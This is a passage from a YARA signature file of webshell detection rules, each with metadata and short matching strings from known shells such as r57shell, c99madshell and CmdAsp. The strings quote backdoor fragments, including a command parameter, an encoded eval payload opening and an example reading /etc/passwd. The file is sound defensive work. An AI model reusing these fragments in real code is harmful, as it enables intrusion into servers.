		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3753-L3767"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "c372b725419cdfd3f8a6371cfeebc2fd"
		logic_hash = "c794b216bafdaecf5bd138cc8c7552efbb8c3c571a441489d02a19793a4c294f"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Cr4sh_aka_RKL"
		$s1 = "NGH edition"
		$s2 = "/* connectback-backdoor on perl"
		$s3 = "<form action=<?=$script?>?act=bindshell method=POST>"
		$s4 = "$logo = \"R0lGODlhMAAwAOYAAAAAAP////r"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Jsp_Reverse_Jsp_1
{
	meta:
		description = "Semi-Auto-generated  - file jsp-reverse.jsp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "4953b230-4cd9-55d6-a3cb-8d3713e7fb0c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3768-L3780"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8b0e6779f25a17f0ffb3df14122ba594"
		logic_hash = "bdd2db4c032b25faaaf3a3a8e769000013f643ecfcb8b0374165a244ad2162a6"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "// backdoor.jsp"
		$s1 = "JSP Backdoor Reverse Shell"
		$s2 = "http://michaeldaw.org"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Tool_Asp_1
{
	meta:
		description = "Semi-Auto-generated  - file Tool.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "e5e727bd-836b-5540-8755-40f37904bc03"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3781-L3794"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8febea6ca6051ae5e2ad4c78f4b9c1f2"
		logic_hash = "d6bd782302b2c614fc572babb3825c0e1fcd0de5841ca8541ca27580ccc274d4"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "mailto:rhfactor@antisocial.com"
		$s2 = "?raiz=root"
		$s3 = "DIGO CORROMPIDO<BR>CORRUPT CODE"
		$s4 = "key = \"5DCADAC1902E59F7273E1902E5AD8414B1902E5ABF3E661902E5B554FC41902E53205CA0"

	condition:
		2 of them
}

rule SIGNATURE_BASE_NT_Addy_Asp_1
{
	meta:
		description = "Semi-Auto-generated  - file NT Addy.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "18f5f360-8690-5e09-ac18-b8cc4f678811"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3795-L3807"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "2e0d1bae844c9a8e6e351297d77a1fec"
		logic_hash = "0fc61d5e276786b8be822712cdcfc81146998e535532e44d3da92e0668713a48"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "NTDaddy v1.9 by obzerve of fux0r inc"
		$s2 = "<ERROR: THIS IS NOT A TEXT FILE>"
		$s4 = "RAW D.O.S. COMMAND INTERFACE"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Simattacker___Vrsion_1_0_0___Priv8_4_My_Friend_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file SimAttacker - Vrsion 1.0.0 - priv8 4 My friend.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "8a34f4fd-337d-5eb4-b7b7-4adb1c2b7937"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3808-L3820"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "089ff24d978aeff2b4b2869f0c7d38a3"
		logic_hash = "46bc4063d06b4af3e4e61e1e998d489e974e76f17363c9777b8afc39ff21f698"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "SimAttacker - Vrsion : 1.0.0 - priv8 4 My friend"
		$s3 = " fputs ($fp ,\"\\n*********************************************\\nWelcome T0 Sim"
		$s4 = "echo \"<a target='_blank' href='?id=fm&fedit=$dir$file'><span style='text-decora"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Remexp_Asp_1
{
	meta:
		description = "Semi-Auto-generated  - file RemExp.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "900036ce-ff13-5441-bb77-906ea08a4ca0"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3821-L3833"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "aa1d8491f4e2894dbdb91eec1abc2244"
		logic_hash = "c7da9908a0252e95b47dbc8fbb36aeac1661dc464123aaca036bd51047a31584"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "<title>Remote Explorer</title>"
		$s3 = " FSO.CopyFile Request.QueryString(\"FolderPath\") & Request.QueryString(\"CopyFi"
		$s4 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Phvayvv_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file phvayvv.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "76351a59-8f52-5110-a9b8-36edd59026df"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3834-L3846"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "35fb37f3c806718545d97c6559abd262"
		logic_hash = "503a69a7e2c30cc82eba430082627bb93c459a95f675b968126bf4524c598863"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "{mkdir(\"$dizin/$duzenx2\",777)"
		$s1 = "$baglan=fopen($duzkaydet,'w');"
		$s2 = "PHVayv 1.0"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Klasvayv_Asp_1
{
	meta:
		description = "Semi-Auto-generated  - file klasvayv.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "3ca4c20c-f879-55a0-9070-d40fc903f9ae"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3847-L3860"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "2b3e64bf8462fc3d008a3d1012da64ef"
		logic_hash = "eb1b11e02b075a4e7d28b77cf91ad596a85e4c697a36304ee177d46735965e75"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "set aktifklas=request.querystring(\"aktifklas\")"
		$s2 = "action=\"klasvayv.asp?klasorac=1&aktifklas=<%=aktifklas%>&klas=<%=aktifklas%>"
		$s3 = "<font color=\"#858585\">www.aventgrup.net"
		$s4 = "style=\"BACKGROUND-COLOR: #95B4CC; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT"

	condition:
		1 of them
}

rule SIGNATURE_BASE_R57Shell_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file r57shell.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "1f1070e8-e82c-5cae-a64a-cd5028adae97"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3861-L3874"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d28445de424594a5f14d0fe2a7c4e94f"
		logic_hash = "658eec4f3c463ec1a480bcb7ba995b8d81d1fb846832e569751d9f505f0fa87e"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = " else if ($HTTP_POST_VARS['with'] == \"lynx\") { $HTTP_POST_VARS['cmd']= \"lynx "
		$s2 = "RusH security team"
		$s3 = "'ru_text12' => 'back-connect"
		$s4 = "<title>r57shell</title>"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Rst_Sql_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file rst_sql.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "41730336-0dce-5ed9-95b0-c911a4e3cb48"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3875-L3888"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "0961641a4ab2b8cb4d2beca593a92010"
		logic_hash = "d15cf69d9ad8683d2ac1ff09b08b0b26ecaf35df8e45bbd5c3a02c393f88cb34"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "C:\\tmp\\dump_"
		$s1 = "RST MySQL"
		$s2 = "http://rst.void.ru"
		$s3 = "$st_form_bg='R0lGODlhCQAJAIAAAOfo6u7w8yH5BAAAAAAALAAAAAAJAAkAAAIPjAOnuJfNHJh0qtfw0lcVADs=';"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Wh_Bindshell_Py_1
{
	meta:
		description = "Semi-Auto-generated  - file wh_bindshell.py.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "b7acbfe7-fd28-5832-9af2-1c5befe4bbab"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3889-L3901"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "fab20902862736e24aaae275af5e049c"
		logic_hash = "e38a4f5c23371705f9bbf2db8e65d68074554edc1022576166e76d40e06bc039"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "#Use: python wh_bindshell.py [port] [password]"
		$s2 = "python -c\"import md5;x=md5.new('you_password');print x.hexdigest()\"" fullword
		$s3 = "#bugz: ctrl+c etc =script stoped=" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_C99Madshell_V2_0_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file c99madshell_v2.0.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "b0724920-dc1e-5819-a99b-618a9a7e1eca"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3915-L3925"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d27292895da9afa5b60b9d3014f39294"
		logic_hash = "07922511d9dfdd32f6b1f47479fca2063b773024a20dcab6f5cf4d56d66c3397"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s2 = "eval(gzinflate(base64_decode('HJ3HkqNQEkU/ZzqCBd4t8V4YAQI2E3jvPV8/1Gw6orsVFLyXef"

	condition:
		all of them
}

rule SIGNATURE_BASE_Uploader_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file uploader.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "62aa783b-f12f-5bb5-9d96-7aee1666788b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3938-L3950"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "0b53b67bb3b004a8681e1458dd1895d0"
		logic_hash = "6e6ffc4cad2a956cb2b6667928bac5996cf95cd36f43ba789144c46726471f07"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s2 = "move_uploaded_file($userfile, \"entrika.php\"); " fullword
		$s3 = "Send this file: <INPUT NAME=\"userfile\" TYPE=\"file\">" fullword
		$s4 = "<INPUT TYPE=\"hidden\" name=\"MAX_FILE_SIZE\" value=\"100000\">" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Telnet_Pl_1
{
	meta:
		description = "Semi-Auto-generated  - file telnet.pl.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "be4de017-e929-5dd3-a60e-f187456b1a55"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3951-L3962"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "dd9dba14383064e219e29396e242c1ec"
		logic_hash = "2d1abc52fc70ce664a19e49e6fa4175bc8d8785dee332d5273323479d9628a8c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "W A R N I N G: Private Server"
		$s2 = "$Message = q$<pre><font color=\"#669999\"> _____  _____  _____          _____   "

	condition:
		all of them
}

rule SIGNATURE_BASE_W3D_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file w3d.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "1a4e3c84-2d3b-5245-bccc-9a5f59b9fc17"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3963-L3975"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "987f66b29bfb209a0b4f097f84f57c3b"
		logic_hash = "33f948a1ae4474daddd788df84fa8baabf4390ec242cad9a6a51dac0152d3b75"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "W3D Shell"
		$s1 = "By: Warpboy"
		$s2 = "No Query Executed"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Cgi_1
{
	meta:
		description = "Semi-Auto-generated  - file WebShell.cgi.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "b768bb72-64e8-545a-9123-3d5889b58a82"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3976-L3987"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "bc486c2e00b5fc3e4e783557a2441e6f"
		logic_hash = "8908ced96284de6b6d5ae693ba54c49a6333bbe5780d951cbacc91b4dde027df"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "WebShell.cgi"
		$s2 = "<td><code class=\"entry-[% if entry.all_rights %]mine[% else"

	condition:
		all of them
}

rule SIGNATURE_BASE_Winx_Shell_Html_1
{
	meta:
		description = "Semi-Auto-generated  - file WinX Shell.html.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "fe02d995-4375-5ce9-aabe-fae5d29278d3"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3988-L4000"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "17ab5086aef89d4951fe9b7c7a561dda"
		logic_hash = "4248f807d66990946523ba7b92d795c2c40429182389d9bf3f4a972e246b50c6"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "WinX Shell"
		$s1 = "Created by greenwood from n57"
		$s2 = "<td><font color=\\\"#990000\\\">Win Dir:</font></td>"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Dx_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file Dx.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "67d0bccb-d39a-5e30-bdc0-801525ebddd7"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4001-L4013"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "9cfe372d49fe8bf2fac8e1c534153d9b"
		logic_hash = "ab43ddcf317eb4db890ca9750dc6bbc19b06b806339a67c82216df02bc2e8446"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "print \"\\n\".'Tip: to view the file \"as is\" - open the page in <a href=\"'.Dx"
		$s2 = "$DEF_PORTS=array (1=>'tcpmux (TCP Port Service Multiplexer)',2=>'Management Util"
		$s3 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTTP"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Csh_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file csh.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "da691516-d6c9-5c4b-85c3-f1cd7fc96ae7"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4014-L4027"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "194a9d3f3eac8bc56d9a7c55c016af96"
		logic_hash = "2a74e06a9fd59d7a577041b49403738904239fb011f9bfe2fb665165991b9c98"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = ".::[c0derz]::. web-shell"
		$s1 = "http://c0derz.org.ua"
		$s2 = "vint21h@c0derz.org.ua"
		$s3 = "$name='63a9f0ea7bb98050796b649e85481845';//root"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Phpinj_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file pHpINJ.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "7bf54ef4-a3d8-51c6-8db7-bf8947e992ed"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4028-L4040"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d7a4b0df45d34888d5a09f745e85733f"
		logic_hash = "5d39fd31cdaae7765267ce8a35a2fdcf86e7f0de40d4f303fb0f219c0fc04e40"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "News Remote PHP Shell Injection"
		$s3 = "Php Shell <br />" fullword
		$s4 = "<input type = \"text\" name = \"url\" value = \""

	condition:
		2 of them
}

rule SIGNATURE_BASE_Sig_2008_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file 2008.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "bfa3caa9-70a5-536b-a887-58427eee43df"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4041-L4054"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "3e4ba470d4c38765e4b16ed930facf2c"
		logic_hash = "a437dc3dc836e93c7a691f7a000c4a4ae574ba95b3a216394ba42538beb9c0f7"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Codz by angel(4ngel)"
		$s1 = "Web: http://www.4ngel.net"
		$s2 = "$admin['cookielife'] = 86400;"
		$s3 = "$errmsg = 'The file you want Downloadable was nonexistent';"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Rem_View_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file Rem View.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "6137434c-89e9-537b-9b26-b56178022b76"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4068-L4080"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "29420106d9a81553ef0d1ca72b9934d9"
		logic_hash = "bcd5c86e793748ffe0ce4415ee68101e8183e1f97477b49843938d254f08695a"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "$php=\"/* line 1 */\\n\\n// \".mm(\"for example, uncomment next line\").\""
		$s2 = "<input type=submit value='\".mm(\"Delete all dir/files recursive\").\" (rm -fr)'"
		$s4 = "Welcome to phpRemoteView (RemView)"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Java_Shell_Js_1
{
	meta:
		description = "Semi-Auto-generated  - file Java Shell.js.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "eff52c3a-fc3a-5e80-8da9-786168159ebc"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4081-L4093"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "36403bc776eb12e8b7cc0eb47c8aac83"
		logic_hash = "f312298ac30ab57b21222a529b1566b9a66909806e4bc88120ac3992cfd3c6fb"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s2 = "PySystemState.initialize(System.getProperties(), null, argv);" fullword
		$s3 = "public class JythonShell extends JPanel implements Runnable {" fullword
		$s4 = "public static int DEFAULT_SCROLLBACK = 100"

	condition:
		2 of them
}

rule SIGNATURE_BASE_STNC_Php_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file STNC.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "8a7167f6-fa62-574f-a37c-3ceadc7f92ec"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4094-L4107"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "2e56cfd5b5014cbbf1c1e3f082531815"
		logic_hash = "b4118dc45ac109bde1cafda24cc103370db57c1993690f450cff828c1633af3c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "drmist.ru" fullword
		$s1 = "hidden(\"action\",\"download\").hidden_pwd().\"<center><table><tr><td width=80"
		$s2 = "STNC WebShell"
		$s3 = "http://www.security-teams.net/index.php?showtopic="

	condition:
		1 of them
}

rule SIGNATURE_BASE_Azrailphp_V1_0_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file aZRaiLPhp v1.0.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "60152b96-e8d3-5b06-a855-fb64a490742b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4108-L4120"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "26b2d3943395682e36da06ed493a3715"
		logic_hash = "4385f294e59b644fe86d8380db4f7926924eb744ad80735b78ef778d2f7e8ae0"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "azrailphp"
		$s1 = "<br><center><INPUT TYPE='SUBMIT' NAME='dy' VALUE='Dosya Yolla!'></center>"
		$s3 = "<center><INPUT TYPE='submit' name='okmf' value='TAMAM'></center>"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Moroccan_Spamers_Ma_Edition_By_Ghost_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file Moroccan Spamers Ma-EditioN By GhOsT.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "721d6e9f-a237-5462-a8d3-f838d7fda420"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4121-L4133"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d1b7b311a7ffffebf51437d7cd97dc65"
		logic_hash = "e755e4ea467861e5217d532b161bf4c582ff71aa1e4720dfa4b75d6e8d7629d8"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = ";$sd98=\"john.barker446@gmail.com\""
		$s1 = "print \"Sending mail to $to....... \";"
		$s2 = "<td colspan=\"2\" width=\"715\" background=\"/simparts/images/cellpic1.gif\" hei"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Cmdasp_Asp_1
{
	meta:
		description = "Semi-Auto-generated  - file CmdAsp.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "79e0ba85-ed4b-5909-a2fd-9b4125598078"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4147-L4160"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "64f24f09ec6efaa904e2492dffc518b9"
		logic_hash = "95dc25ecd47b43edbd7e7e36966377aa09da769aff2bc1c33a7df87989611bfa"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "CmdAsp.asp"
		$s1 = "Set oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")" fullword
		$s2 = "-- Use a poor man's pipe ... a temp file --"
		$s3 = "maceo @ dogmile.com"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Simple_Backdoor_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file simple-backdoor.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "5607f501-a750-59be-9595-5ac71ea6f74b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4161-L4173"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "f091d1b9274c881f8e41b2f96e6b9936"
		logic_hash = "e2e98580b59727313de298fab0009704f621b1b6556220d5065118d960f7a068"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "$cmd = ($_REQUEST['cmd']);" fullword
		$s1 = "<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->"
		$s2 = "Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Mysql_Shell_Php_1
{
	meta:
		description = "Semi-Auto-generated  - file mysql_shell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "e517984b-575c-5ead-a438-9767d2c74099"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
